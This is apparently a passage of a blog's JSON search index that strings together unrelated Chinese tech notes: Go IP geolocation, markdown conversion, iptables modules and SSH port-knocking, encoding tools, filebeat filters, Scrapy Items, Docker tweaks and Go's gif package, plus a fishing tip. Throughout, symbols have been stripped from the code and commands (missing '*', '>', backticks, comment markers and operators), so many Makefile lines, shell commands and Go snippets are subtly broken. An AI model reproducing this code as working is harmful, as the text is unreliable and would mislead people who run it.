localhost:8080/json/1.2.3.4\n\ngithub.com/ip2location/ip2location-go\n\n\thttp://download.ip2location.com/lite/\n\n\t\tpackage main\n\n\timport (\n\t\t\"fmt\"\n\t\t\"github.com/ip2location/ip2location-go\"\n\t)\n\tfunc main(){\n\t\tip := \"60.213.47.147\"\n\t\tip2location.Open(\"/home/ubuntu/go/IP2LOCATION-LITE-DB1.BIN\")\n\t\tfmt.Println(ip2location.Getcountryshort(ip).Country_short)\n\t}\n\nhttps://github.com/oschwald/geoip2-golang\n\n2. Regional Internet Registry (RIR) file parser \u0026 CLI in Go\n 根据国家代码查询\ngo get github.com/simcap/rir","tags":null},{"location":"//blog.pytool.com/tool/2016-01-01 Linux下批量将md文件转换为html文件","title":"Linux下批量将md文件转换为html文件","text":"https://segmentfault.com/a/1190000000596769\n要将markdown文件转换成html文件，可以用discount或python-markdown软件包提供的markdown工具。\n\n$ sudo apt-get install discount\n\n或\n\n$ sudo apt-get install python-markdown\n\n用discount提供的markdown工具转换：\n\n$ markdown -o Release-Notes.html Release-Notes.md\n\n用python-markdown提供的markdownpy工具转换：\n\n$ markdownpy -o html4 Release-Notest.md   Release-Notes.html\n\n如果要生成PDF，可以用python-pisa提供的xhtml2pdf转换：\n\n$ sudo apt-get install python-pisa\n$ xhtml2pdf --html Release-Notes.html Release-Notes.pdf\n\n也可以在文档目录下放置一个Makefile来自动完成转换过程：\n\nMakefile\n\nMD = markdown\nMDFLAGS = -T\nH2P = xhtml2pdf\nH2PFLAGS = --html\n\nSOURCES := $(wildcard .md)\nOBJECTS := $(patsubst %.md, %.html, $(wildcard .md))\nOBJECTSPDF := $(patsubst %.md, %.pdf, $(wildcard .md))\n\nall: build\n\nbuild: html pdf\n\npdf: $(OBJECTSPDF)\n\nhtml: $(OBJECTS)\n\n$(OBJECTS_PDF): %.pdf: %.html\n    $(H2P) $(H2PFLAGS) $  $@\n\n$(OBJECTS): %.html: %.md\n    $(MD) $(MDFLAGS) -o $@ $\u003c\n\nclean:\n    rm -f $(OBJECTS)\n\nhtml输出：\n\n$ make html\n\npdf输出：\n\n$ make pdf\n\n如果markdown的内容是中文，那么转换出来的html在浏览器中打开就无法自动识别编码，pdf更惨，直接是一堆乱码。这时可以借助markdown对html标记的支持，在markdown文件中加入编码信息。例如我们要将markdown转换为html文件，可以在文件的开头加上meta标记，指明编码格式：\n\n$ sed -i '1i\\meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"' .md\n\n使用以上的方法，转换出来的效果并不理想，所以尝试使用pandoc去转换，在Ubuntu上使用以下指令安装：\n\n$ sudo apt-get autoremove pandoc\n$ sudo apt-get install cabal-install\n$ cabal update\n$ cabal install pandoc\n\nhtml输出：\n\n$ pandoc Release-Notest.md -o Release-Notes.html\n\npdf输出：\n\n$ pandoc Release-Notest.md -o Release-Notes.pdf\n\n参考文章\n\nLinux下批量将md文件批量转换为html文件\n如何在Linux下使用Markdown进行文档工作\n利用Pandoc转换markdown和HTML、LaTeX","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/iptables模块使用示例汇总","title":"Linux命令 iptables","text":"---\niptables模块使用示例汇总\n\nCentos/Linux服务器防火墙/iptables简单设置\n\n/bin/bash\nsshport=netstat -lnp|awk -F\"[ ]+|[:]\" '/sshd/{print$5}'\niptables -F 清除自带规则\niptables -X\niptables -P INPUT DROP #进入本机数据包默认拒绝\niptables -P OUTPUT ACCEPT #本起外出数据包允许\niptables -A INPUT -i lo -j ACCEPT #允许本地环回\niptables -A INPUT -m state --state INVALID  -j LOG --log-prefix \"INVALID\" --log-ip-options\n\n记录无效的数据包并丢弃\niptables -A INPUT -m state --state INVALID  -j  DROP\n\n允许已建立连接与出相关的数据包进入\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n允许目标端口为80的新连接进入\niptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT\n\n允许目标端口为$sshdport的新链接进入\niptables -A INPUT -m state --state NEW -p tcp --dport $sshdport -j ACCEPT\n\n允许ping回应，每秒5个，最多20个\niptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 5/s --limit-burst 20 -j ACCEPT\n\n保存规则，重启iptables服务\nservice iptables save\n\nIptables处理数据包详细流程图\n\nIptables包流程如下：\n\n数据包到达网络接口，比如 eth0。\n进入 raw 表的 PREROUTING 链，这个链的作用是赶在连接跟踪之前处理数据包。\n如果进行了连接跟踪，在此处理。\n进入 mangle 表的 PREROUTING 链，在此可以修改数据包，比如 TOS 等。\n进入 nat 表的 PREROUTING 链，可以在此做DNAT，但不要做过滤。\n决定路由，看是交给本地主机还是转发给其它主机。\n\n到了这里我们就得分两种不同的情况进行讨论了，一种情况就是数据包要转发给其它主机，这时候它会依次经过：\n进入 mangle 表的 FORWARD 链，这里也比较特殊，这是在第一次路由决定之后，在进行最后的路由决定之前，我们仍然可以对数据包进行某些修改。\n进入 filter 表的 FORWARD 链，在这里我们可以对所有转发的数据包进行过滤。需要注意的是：经过这里的数据包是转发的，方向是双向的。\n进入 mangle 表的 POSTROUTING 链，到这里已经做完了所有的路由决定，但数据包仍然在本地主机，我们还可以进行某些修改。\n10. 进入 nat 表的 POSTROUTING 链，在这里一般都是用来做 SNAT ，不要在这里进行过滤。\n11. 进入出去的网络接口。完毕。\n\n另一种情况是，数据包就是发给本地主机的，那么它会依次穿过：\n进入 mangle 表的 INPUT 链，这里是在路由之后，交由本地主机之前，我们也可以进行一些相应的修改。\n进入 filter 表的 INPUT 链，在这里我们可以对流入的所有数据包进行过滤，无论它来自哪个网络接口。\n交给本地主机的应用程序进行处理。\n10. 处理完毕后进行路由决定，看该往那里发出。\n11. 进入 raw 表的 OUTPUT 链，这里是在连接跟踪处理本地的数据包之前。\n12. 连接跟踪对本地的数据包进行处理。\n13. 进入 mangle 表的 OUTPUT 链，在这里我们可以修改数据包，但不要做过滤。\n14. 进入 nat 表的 OUTPUT 链，可以对防火墙自己发出的数据做 NAT 。\n15. 再次进行路由决定。\n16. 进入 filter 表的 OUTPUT 链，可以对本地出去的数据包进行过滤。\n17. 进入 mangle 表的 POSTROUTING 链，同上一种情况的第9步。注意，这里不光对经过防火墙的数据包进行处理，还对防火墙自己产生的数据包进行处理。\n18. 进入 nat 表的 POSTROUTING 链，同上一种情况的第10步。\n19. 进入出去的网络接口，完毕。\n\niptables日记模块LOG使用\n\niptables匹配相应规则后会触发一个动作，filter和nat表一般常用的有以下目标操作。\n\nACCEPT      #允许数据包通过\nDROP        #丢弃数据包，不对该数据包进一步处理\nREFECT      #丢弃数据包，同时发送响应报文\n--reject-with tcp-reset #返回tcp重置\n--reject-with icmp-net-unreachable    #返回网络不可达\n--reject-with icmp-host-unreachable   #返回主机不可达\nRETURN        #转到其它链处理\nLOG           #将数据包信息记录到syslog\n\n本文就记录下LOG规则的使用，示例：进入的tcp端口为80的数据包记录到日记，错误级别err，描述前缀为INPUT，记录IP/TCP相关信息。\n\nmodprobe iptLOG   #加载模块\niptables -A INPUT -p tcp --dport 80 -j LOG --log-level err --log-prefix \"INPUT\" --log-ip-options --log-tcp-sequence\n--log-level           #错误级别\n--log-prefix \"INPUT\"  #描述前缀\n--log-ip-options      #记录IP信息\n--log-tcp-sequence    #记录TCP序列号\n\n然后访问服务器80端口测试，通过dmesg查看记录的信息如下：\n\nINPUTIN=eth0 OUT= MAC=00:0c:29:73:e0:19:8c:89:a5:65:3a:4a:08:00 SRC=192.168.1.16 DST=192.168.1.2 \\\nLEN=522 TOS=0x00 PREC=0x00 TTL=128 ID=27499 DF PROTO=TCP SPT=5430 DPT=80 SEQ=3847892455 \\\nACK=3435733082 WINDOW=16344 RES=0x00 ACK PSH URGP=0\n\n还可以修改syslog将日志写入到文件，vim /etc/syslog.conf 添加以下内容\n\nkern.err   /var/log/iptables #日志文件路径\n\n重启syslog服务\n\n/etc/init.d/syslog restart\n\nIptables模块recent应用\n\nrecent这个模块很有趣，善加利用可充分保证您服务器安全。\n\n设定常用参数：\n\n--name        设定列表名称，默认DEFAULT。\n--rsource   #源地址，此为默认。\n--rdest     #目的地址\n--seconds   #指定时间内\n--hitcount  #命中次数\n--set       #将地址添加进列表，并更新信息，包含地址加入的时间戳。\n--rcheck    #检查地址是否在列表，以第一个匹配开始计算时间。\n--update    #和rcheck类似，以最后一个匹配计算时间。\n--remove    #在列表里删除相应地址，后跟列表名称及地址。\n\n示例：\n\n1）限制80端口60秒内每个IP只能发起10个新连接，超过记录日记及丢失数据包，可防CC及非伪造IP的syn\nflood\n\niptables -A INPUT -p tcp --dport 80 --syn -m recent --name webpool --rcheck --seconds 60 --hitcount 10 -j LOG --log-prefix 'DDOS:' --log-ip-options\niptables -A INPUT -p tcp --dport 80 --syn -m recent --name webpool --rcheck --seconds 60 --hitcount 10 -j DROP\niptables -A INPUT -p tcp --dport 80 --syn -m recent --name webpool --set -j ACCEPT\n\n备忘：每个IP目标端口为80的新连接会记录在案，可在/proc/net/xt\\recent/目录内查看，rcheck检查此IP是否在案及请求次数，如果超过规则就丢弃数据包，否则进入下条规则并更新列表信息。\n\n2）发送特定指定执行相应操作，按上例如果自己IP被阻止了，可设置解锁哦\n\n记录日志，前缀WEBOPEN:\niptables -A INPUT -p tcp --dport 5000 --syn -j LOG --log-prefix \"WEBOPEN: \"\n\n符合规则即删除webpool列表内的本IP记录\niptables -A INPUT -p tcp --dport 5000 --syn -m recent --remove --name webpool --rsource -j REJECT --reject-with tcp-reset\n\n3）芝麻开门，默认封闭SSH端口，为您的SSH服务器设置开门暗语\n\n记录日志，前缀SSHOPEN:\niptables -A INPUT -p tcp --dport 50001 --syn -j LOG --log-prefix \"SSHOPEN: \"\n\n目标端口tcp50001的新数据设定列表为sshopen返回TCP重置，并记录源地址\niptables -A INPUT -p tcp --dport 50001 --syn -m recent --set --name sshopen --rsource -j REJECT --reject-with tcp-reset\n\n开启SSH端口，15秒内允许记录的源地址登录SSH\niptables -A INPUT -p tcp --dport 22 --syn -m recent --rcheck --seconds 15 --name sshopen --rsource -j ACCEPT\n\n开门钥匙\nnc host 50001\ntelnet host 50001\nnmap -sS host 50001\n\n指定端口容易被破解密钥，可以使用ping指定数据包大小为开门钥匙\n\n记录日志，前缀SSHOPEN:\niptables -A INPUT -p icmp --icmp-type 8 -m length --length 78 -j LOG --log-prefix \"SSHOPEN: \"\n\n指定数据包78字节，包含IP头部20字节，ICMP头部8字节\niptables -A INPUT -p icmp --icmp-type 8 -m length --length 78 -m recent --set --name sshopen --rsource -j ACCEPT\niptables -A INPUT -p tcp --dport 22 --syn -m recent --rcheck --seconds 15 --name sshopen --rsource -j ACCEPT\n\nping -s 50 host     #Linux下解锁\nping -l 50 host     #Windows下解锁\n\nIptables限速模块limit应用\n\nIptables模块limit用于限制单位时间内通过的数据包数量，限制是全局的，适用于某些不重要的服务，如果限制ICMP数量，HTTP可使用recent模块针对每个IP做限制，精确流量限制可用TC。\n\nLimit可用选项：\n\n--limit 单位时间内匹配的数据包数量\n--limit-burst 可选，允许最大数据包数量，默认为5\n/s /h /m 单位时间\n\n应用举例：\n\n每分钟允许通过1个ICMP数据包，最多不超过10个。\n\niptables -A INPUT -p icmp -m limit --limit 1/m --limit-burst 10 -j ACCEPT\niptables -A INPUT -p icmp  -j DROP\n\nIptables之conntrack连接跟踪模块\n\nIptables是有状态机制的防火墙，通过conntrack模块跟踪记录每个连接的状态，通过它可制定严密的防火墙规则。\n\n可用状态机制：\n\nNEW         #新连接数据包\nESTABLISHED #已连接数据包\nRELATED     #和出有送的数据包\nINVALID     #无效数据包\n\nconntrack默认最大跟踪65536个连接，查看当前系统设置最大连接数：\n\ncat /proc/sys/net/ipv4/ipconntrackmax\n\n查看当前跟踪连接数：\n\n cat /proc/net/ipconntrack | wc -l\n\n当服务器连接多于最大连接数时会出现kernel: ip\\conntrack: table full,\ndropping packet的错误。\n\n解决方法，修改conntrack最大跟踪连接数：\n\nvi /etc/sysctl.conf 添加以下内容\n\nnet.ipv4.ipconntrackmax = 102400\n\n立即生效：\n\nsysctl -p\n\n为防止重启Iptables后变为默认，还需修改模块参数：\n\nvi /etc/modprobe.conf 添加以下内容\n\n值为102400/8\noptions ipconntrack hashsize=12800\n\n一劳永逸的方法，设置Iptables禁止对连接数较大的服务进行跟踪：\n\niptables -A INPUT -m state --state UNTRACKED,ESTABLISHED,RELATED -j ACCEPT\niptables -t raw -A PREROUTING -p tcp --dport 80 -j NOTRACK\niptables -t raw -A OUTPUT -p tcp --sport 80 -j NOTRACK\n\nIptables之connlimit模块针对每个IP限制连接数\n\n上面有介绍Iptables下limit模块，此模块应用限制是全局的，connlimit就灵活了许多，针对每个IP做限制。\n\n应用示例，注意不同的默认规则要使用不同的方法。\n\n1）默认规则为DROP的情况下限制每个IP连接不超过10个\n\niptables -P INPUT DROP\niptables -A INPUT -p tcp --dport 80 -m connlimit ! --connlimit-above 10 -j ACCEPT\n\n2）默认规则为ACCEPT的情况下限制每个IP连接不超过10个\n\niptables -P INPUT ACCEPT\niptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 10 -j DROP\n\nIptables模块recent错误iptables: Unknown error 18446744073709551615解决\n\nIptables的recent用做防CC效果很好，刚刚在调整单个IP跟踪数据包数量时遇到以下错误\n:\n\niptables: Unknown error 18446744073709551615\niptables: Unknown error 18446744073709551615\niptables: Unknown error 4294967295\niptables: Unknown error 4294967295\n\n查看recent模块已正常加载：\n\nlsmod | grep recent\niptrecent      42969  3\nxtables        50505  7 iptrecent,xtstate,iptables,iptLOG,iptREJECT,xttcpudp,ip6tables\n\n使用modinfo命令，span查看recent模块信息：/span\n\nmodinfo     iptrecent\n\n得到如下信息：\n\nfilename:       /lib/modules/2.6.18-348.16.1.el5xen/kernel/net/ipv4/netfilter/iptrecent.ko\nlicense:        GPL\ndescription:    IP tables recently seen matching module\nauthor:         Patrick McHardy kaber@trash.net\nsrcversion:     98489C441E24A457\ndepends:        xtables\nvermagic:       2.6.18-348.16.1.el5xen SMP modunload 686 REGPARM 4KSTACKS gcc-4.1\nparm:           iplisttot:number of IPs to remember per list (uint)\nparm:           ippktlisttot:number of packets per IP to remember (max. 255) (uint)\nparm:           iplisthashsize:size of hash table used to look up IPs (uint)\nparm:           iplistperms:permissions on /proc/net/iptrecent/ files (uint)\nmodulesig: 89811280930a09a91aef1b8885b4e5f21b61320a08694f06cde9625301f4ea4289a\n\n可见recent最大跟踪IP及数据包数量可以调整的，设置最大跟踪数据包为100：\n\n cat     /etc/modprobe.conf \u003c","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-03-29 单点登录SSO","title":"单点登录SSO","text":"单点登录的三种实现方式\n登录那些事儿\n\nSSO登录用户同步到多说","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 enca","title":"Linux命令 enca 编码转换","text":"iconv\n输入/输出格式规范：\n-f, --from-code=名称 原始文本编码\n-t, --to-code=名称 输出编码\n\n信息：\n-l, --list 列举所有已知的字符集\n\n输出控制：\n-c 从输出中忽略无效的字符\n-o, --output=FILE 输出文件\n-s, --silent 关闭警告\n--verbose 打印进度信息\niconv -l | grep \niconv -f utf-8 -t gb2312 config   config.tmp\ncurl -s http://www.google.com.hk/ | iconv -f big5 -t gbk\n\n 转换文件编码 enca\nenca -L zhCN -x UTF-8 .md\n\n更好的傻瓜型命令行工具enca，它不但能智能的识别文件的编码，而且还支持成批转换。  　　\n1.安装  　　\n$sudo apt-get install enca  　　\n2.查看当前文件编码  　　\nenca -L zhCN ip.txt     Simplified Chinese National Standard; GB2312     Surrounded by/intermixed with non-text data  　　\n3.转换  　　命令格式如下  　　\n$enca -L 当前语言 -x 目标编码 文件名  　　\n例如要把当前目录下的所有文件都转成utf-8  　　\nenca -L zhCN -x utf-8      \n检查文件的编码　enca -L zhCN file   　　\n将文件编码转换为\"UTF-8\"编码　 enca -L zhCN -x UTF-8 file\n如果不想覆盖原文件可以这样         enca -L zhCN -x UTF-8  file1  file2\n\nlinux文件名编码转换工具convmv\n今天介绍个文件名转码的工具–convmv，convmv能帮助我们很容易地对一个文件，一个目录下所有文件进行编码转换，比如gbk转为utf8等。\n语法：\nconvmv [options] FILE(S) … DIRECTORY(S)\n主要选项：\n1、-f ENCODING\n指定目前文件名的编码，如-f gbk\n2、-t ENCODING\n指定将要转换成的编码，如-t utf-8\n3、-r\n递归转换目录下所有文件名\n4、–list\n列出所有支持的编码\n5、–notest\n默认是只打印转换后的效果，加这个选项才真正执行转换操作。\n更多选项请man convmv。\n\nconvmv -f 源编码 -t 新编码 [选项] 文件名\n常用参数：\n   -r 递归处理子文件夹\n   --notest 真正进行操作，请注意在默认情况下是不对文件进行真实操作的，而只是试验。\n   --list 显示所有支持的编码\n   --unescap 可以做一下转义，比如把%20变成空格\n比如我们有一个utf8编码的文件名，转换成GBK编码，命令如下：\nconvmv -f UTF-8 -t GBK --notest utf8编码的文件名\n\n例子：递归转换centos目录下的目前文件名编码gbk为utf-8:\nconvmv -f gbk -t utf-8 --notest -r centos","tags":null},{"location":"//blog.pytool.com/Post/Elastic/beats/2016-10-04 Beat过滤器processor","title":"filebeat 过滤器","text":"数据过滤有两个地方\n在 prospectors中 通过 includelines, excludelines, and excludefiles.\n\nfilebeat.prospectors:\ninputtype: log\n  paths:\n    /var/log/myapp/.log\n  includelines: [\"^ERR\", \"^WARN\"]\n在 processors 中通过事件过滤器(管道) 目前支持5种addcloudmetadata decodejsonfields dropevent dropfields includefields\n\n在数据输出之前可以通过libbeat提供的processor预处理\n每一个processors其接受一个事件event 处理后返回一个时间event\nevent -  processor 1 -  event1 -  processor 2 -  event2 ...\n\naddcloudmetadata\n\n 1.丢弃信息 dropevent   \n丢弃 DBG 开头的信息\nprocessors:\n dropevent:\n     when:\n        regexp:\n           message: \"^DBG:\"\n丢弃 包含test的信息\nprocessors:\ndropevent:\n    when:\n       contains:\n          source: \"test\"\n2.解码json decodejsonfields\nprocessors:\n decodejsonfields:\n     fields: [\"field1\", \"field2\", ...]  解码字段\n     processarray: false              # 数组是否解码 默认:false\n     maxdepth: 1                      # 解码深度\n     target:            \n     overwritekeys: false             # 覆盖字段  默认:false\n\n3. 丢弃字段 dropfields\n注:@timestamp 和 type 字段 不论添不添加都不会删掉\n  processors:\n dropfields:\n     when:\n        condition\n     fields: [\"field1\", \"field2\", ...]\n  4. 包含字段include_fields\n\nApache2 Fields\nAuditd Fields\nBeat Fields\nCloud Provider Metadata Fields\nLog File Content Fields\nMySQL Fields\nNginx Fields\nSystem Fields\n\n条件判断 conditions\n 1. 相等\nequals:\n  http.response.code: 200\n\n2. 包含  contains condition checks if a value is part of a field.\n  fields 可以是string 或 array ; value必须是sting\ncontains:\n  status: \"Specific error\"  \n 3. 正则匹配\n    regexp:\n      system.process.name: \"foo.\"\n4. 范围匹配\nrange:\n    http.response.code:\n        gte: 400\nrange:\n    http.response.code.gte: 400\n  0.5 \u003c system.cpu.use \u003c 0.8\nrange:\n    system.cpu.user.pct.gte: 0.5\n    system.cpu.user.pct.lt: 0.8    \n 5. 与\nand:\n  equals:\n      http.response.code: 200\n  equals:\n      status: OK\n6. 或\nor:\n  equals:\n      http.response.code: 304\n  equals:\n      http.response.code: 404\n 7. 非\nnot:\n  equals:\n    status: OK","tags":null},{"location":"//blog.pytool.com/Post/scrapy/2014-04-27-scrapy-Items","title":"scrapy Items","text":"原文地址：http://doc.scrapy.org/en/latest/topics/items.html\n\n爬取网页最主要的目的就是从非结构化的来源中，通常是网页，提取结构化的数据。为此，scrapy提供了item类。\n\nItem是用来收集抓取数据的简单容器，它提供了dictionary-like api 可以方便的声明fields。\n\n声明item\n\n\timport scrapy\n\n\tclass Product(scrapy.Item):\n    \tname = scrapy.Field()\n    \tprice = scrapy.Field()\n    \tstock = scrapy.Field()\n    \tlastupdated = scrapy.Field(serializer=str)\n\nscrapy item 类似于Django modle ,只是scrapy item 更简单，因为它所有field 类型都一样。\n\nItem Field\nField对象用来给每个域指定元数据。例如：上面例子展示的lastupdateed域指定了serializer函数。\n\n你可以指定任何的元数据，Field 对象接受的值并没有限制。所以，没有一个可用的元数据键的列表。每个键会被不同的组件使用到，并且只有这些组件知道。Field对象最主要的目的是提供一个方式将所有元数据定义到一个地方。\n\n使用item\n下面是一些使用item的场景，用到了上面定义的Produc item。\n创建\n\n\t      product = Product(name='Desktop PC', price=1000)\n\t      print product\n\tProduct(name='Desktop PC', price=1000)\n\n取值\n\n\t      product['name']\n\tDesktop PC\n\t      product.get('name')\n\tDesktop PC\n\n\t      product['price']\n\t1000\n\n\t      product['lastupdated']\n\tTraceback (most recent call last):\n    \t...\n\tKeyError: 'lastupdated'\n\n\t      product.get('lastupdated', 'not set')\n\tnot set\n\n\t      product['lala']  getting unknown field\n\tTraceback (most recent call last):\n    \t...\n\tKeyError: 'lala'\n\n\t      product.get('lala', 'unknown field')\n\t'unknown field'\n\n\t      'name' in product  # is name field populated?\n\tTrue\n\n\t      'lastupdated' in product  # is lastupdated populated?\n\tFalse\n\n\t      'lastupdated' in product.fields  # is lastupdated a declared field?\n\tTrue\n\n\t      'lala' in product.fields  # is lala a declared field?\n\tFalse\n\n赋值\n\n          product['lastupdated'] = 'today'\n          product['lastupdated']\n    today\n\n          product['lala'] = 'test'  setting unknown field\n    Traceback (most recent call last):\n    ...\n    KeyError: 'Product does not support field: lala'\n\n取得所有填充的值\n\n          product.keys()\n    ['price', 'name']\n\n          product.items()\n    [('price', 1000), ('name', 'Desktop PC')]\n\n其它常见任务\n\n拷贝item\n\n          product2 = Product(product)\n          print product2\n    Product(name='Desktop PC', price=1000)\n\n          product3 = product2.copy()\n          print product3\n    Product(name='Desktop PC', price=1000)\n\n用item创建字典\n\n          dict(product) # create a dict from all populated values\n    {'price': 1000, 'name': 'Desktop PC'}\n\n用字典创建item\n\n          Product({'name': 'Laptop PC', 'price': 1500})\n    Product(price=1500, name='Laptop PC')\n\n          Product({'name': 'Laptop PC', 'lala': 1500}) # warning: unknown field in dict\n    Traceback (most recent call last):\n    ...\n    KeyError: 'Product does not support field: lala'\n\n扩展item\n通过声明继承你原始的item，可以扩展item（给它添加更多的field，或者是改变一些field的元数据）。例如：\n\n    class DiscountedProduct(Product):\n    \tdiscountpercent = scrapy.Field(serializer=str)\n    \tdiscountexpirationdate = scrapy.Field()\n\n通过使用之前的field元数据再加上新的值，还可以扩展元数据或者是改变已经存在的值，例如：\n\n\tclass SpecificProduct(Product):\n    \tname = scrapy.Field(Product.fields['name'],serializer=my_serializer)\n\n添加或者替换serializer 元数据会保留之前已经存在的元数据值。\n\nitem对象\n\n\tclass scrapy.item.Item([arg])\n\n返回一个新item,可以通过参数进行初始化（可选）。\n\nitem复制了标准dict api ,包括它的constructor。只是增加了一个fields属性。\n\n\tfields\n\n一个包含了所有声明的field的dict，不只是已填充的。键是field name，值是Field对象。\n\nField对象\n\n\tclass scrapy.item.Field([arg])\n\nField类就是内置的dict类的别名，它并不提供额外的方法和属性。也就是说，Field对象就是纯python dict。","tags":null},{"location":"//blog.pytool.com/Other/2017-04-01 钓鱼","title":"钓鱼","text":"有很多钓鱼新手也许到现在都没弄明白什么是正口？小编建议钓到的头几条鱼要用手摘钩，看看中钩位置的情况。\n\n通常钩上唇证明我们调钓正常，鱼吃口正常，即为正口。经常钩下唇，证明我们钓的钝了，做出相应的调整就可以了，还有如果中钩位置在两侧，说明提杆时机不对，抓口不准！\n\n首先如果是上钩连续中鱼，证明我们钓的钝了，若是下钩连续中鱼证明钓的偏灵敏了，调钓正常应该是上下钩中鱼率几乎差不多。\n\n比如我们今天半水调4目钓4目，先从不灵不钝开始，可通过察看鱼漂来体会水下鱼的情况，这里也有两种情况：\n\n提竿不中鱼，说明我们钓的过于灵敏了，这时可进行向上推漂，以1/3-1/2目为一个标点，直到稳定中鱼。\n还有一种情况就是如果没有看到浮漂动作，提竿换饵的时候，却无意中鱼了，证明我们钓的过于迟钝了，这个时候应果断的向下拉漂，要一点一点的找，直到提杆中鱼。","tags":null},{"location":"//blog.pytool.com/hugo/hugo_mathjax","title":"Hugo 集成 MathJax","text":"简介\n\nMathJax 是一款用于显示 LaTex 等风格数学公式的利器，只需要将其简单几步就可以将其集成到 Hugo 中。\n\n 引用 MathJax\n\n为了展示文章中编写的 LaTeX 数学公式，需要集成 MathJax。MathJax 是一个 Javascript 库，通过官方提供的 CDN 集成到自己站点十分简单，只需要将以下代码添加到站点的每一个 HTML 页面中\n\n","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 top","title":"Linux 监控命令","text":" iotop  -o  查看负载较高的io\niotop [OPTIONS]\n\n主要选项有：\n-o :只显示有io操作的进程\n-b :批量显示，无交互。主要用作记录到文件。\n-n NUM:显示NUM次，主要用于非交互式模式。\n-d SEC：刷新时间\n-p PID:监控的指定进程pid\n-u USER:监控的指定用户。\n\n输入大写P，则结果按CPU占用降序排序。\n输入大写M，结果按内存占用降序排序。\n\n输入1 查看cpu核数","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-01-02 Linux命令 alpine","title":"Linux命令 alpie","text":"ENV TIMEZONE Asia/Shanghai\nRUN ln -snf /usr/share/zoneinfo/$TIMEZONE /etc/localtime\nRUN echo $TIMEZONE   /etc/timezone\n\nRUN sed -i '$a \\\n    soft nproc 65536 \\\n    hard nproc 65536  \\\n    soft nofile 65536  \\\n    hard nofile 65536  \\\n    '  \\\n    /etc/security/limits.conf\n\n  #RUN sed -i '$a \\\n  #        fs.file-max = 767246   \\\n  #        fs.aio-max-nr = 1048576  \\\n  #        ' /etc/sysctl.conf\n\n  RUN sed -i '$a \\\n              ulimit -s 4096   \\\n              ulimit -m 15728640  \\\n          ' /etc/profile","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/gif","title":"golang中image/gif包用法","text":"golang中image/gif包用法\n\ngif包实现了gif图片的解码及编码\nfunc Decode(r io.Reader) (image.Image, error)      //Decode从r中读取一个GIF图像，然后返回的image.Image是第一个嵌入的图。\n\nfunc DecodeConfig(r io.Reader) (image.Config, error)   //DecodeConfig不需要解码整个图像就可以返回全局的颜色模型和GIF图片的尺寸。\n\ntype Config struct {\n    ColorModel    color.Model\n    Width, Height int\n}\n\nConfig返回图像的颜色model和尺寸\nfunc Encode(w io.Writer, m image.Image, o \\Options) error    //将图片m按照gif模式写入w中\n\ntype Options struct {\n    // NumColors是图片中使用颜色的最大值，它的范围是1-256\n    NumColors int\n\n    // Quantizer经常被用来通过NumColors产生调色板，palette.Plan9 被用来替代nil Quantizer\n    Quantizer draw.Quantizer\n\n    // Drawer i用于将源图片转化为期望的调色板， draw.FloydSteinberg 用来替代一个空 Drawer.\n    Drawer draw.Drawer\n}\n\nfunc EncodeAll(w io.Writer, g \\GIF) error    //将图片按照帧与帧之间指定的循环次数和时延写入w中\n\ntype GIF struct {\n    Image     []image.Paletted // 连续的图片\n    Delay     []int             // 连续的延迟时间，每一帧单位都是百分之一秒，delay中数值表示其两个图像动态展示的时间间隔\n    LoopCount int               // 循环次数，如果为0则一直循环。\n}\n\nfunc DecodeAll(r io.Reader) (\\GIF, error) //DecodeAll 从r上读取一个GIF图片，并且返回顺序的帧和时间信息\n\n简单举例说明如何利用gif包制作一个gif图片，画两条垂直相交的动态图线（如果想要得到复杂的gif图像，可以自己设置较复杂的画线以及颜色模式，得到复杂图形）：\n\npackage main\n\nimport (\n    \"fmt\"\n    \"image\"\n    \"image/color\"\n    \"image/color/palette\"\n    \"image/gif\"\n    \"net/http\"\n    \"os\"\n)\n\nfunc main() {\n    http.HandleFunc(\"/display\", display)\n    err := http.ListenAndServe(\":9100\", nil)\n    if err != nil {\n        fmt.Println(err)\n    }\n}\n\nfunc display(w http.ResponseWriter, q http.Request) {\n\n    f1, err := os.Create(\"test.gif\")\n    if err != nil {\n        fmt.Println(err)\n    }\n    defer f1.Close()\n\n    p1 := image.NewPaletted(image.Rect(0, 0, 110, 110), palette.Plan9)\n    for x := 0; x \u003c 100; x++ {\n        for y := 0; y \u003c 100; y++ {\n            p1.Set(50, y, color.RGBA{uint8(x), uint8(y), 255, 255})\n\n        }\n    }\n    p2 := image.NewPaletted(image.Rect(0, 0, 210, 210), palette.Plan9)\n    for x := 0; x \u003c 100; x++ {\n        for y := 0; y \u003c 100; y++ {\n            p2.Set(x, 50, color.RGBA{uint8(x  x % 255), uint8(y  y % 255), 0, 255})\n\n        }\n    }\n    g1 := \u0026gif.GIF{\n        Image:     []image.Paletted{p1, p2},\n        Delay:     []int{30, 30},\n        LoopCount: 0,\n    }\n    gif.EncodeAll(w, g1)  //浏览器显示\n    gif.EncodeAll(f1, g1) //保存到文件中\n}\n\n动态gif图像如下：\n\n当然，也可以利用已有图片生成gif，代码如下：\n\npackage main\n\nimport (\n    \"fmt\"\n    \"image\"\n    \"image/color/palette\"\n    \"image/draw\"\n    \"image/gif\"\n    \"image/jpeg\"\n    \"image/png\"\n    \"net/http\"\n    \"os\"\n)\n\nfunc main() {\n    http.HandleFunc(\"/display\", display)\n    err := http.ListenAndServe(\":9100\", nil)\n    if err != nil {\n        fmt.Println(err)\n    }\n}\n\nfunc display(w http.ResponseWriter, q http.Request) {\n    f, err := os.Open(\"test.jpeg\")\n    if err != nil {\n        fmt.Println(err)\n    }\n    defer f.Close()\n    g, err := jpeg.Decode(f)\n    if err != nil {\n        fmt.Println(err)\n    }\n\n    f2, err := os.Open(\"123.png\")\n    if err != nil {\n        fmt.Println(err)\n    }\n    defer f.Close()\n\n    g2, err := png.Decode(f2)\n    if err != nil {\n        fmt.Println(err)\n    }\n\n    f1, err := os.Create(\"test.gif\")\n    if err != nil {\n        fmt.Println(err)\n    }\n    defer f1.Close()\n\n    p1 := image.NewPaletted(image.Rect(0, 0, 200, 200), 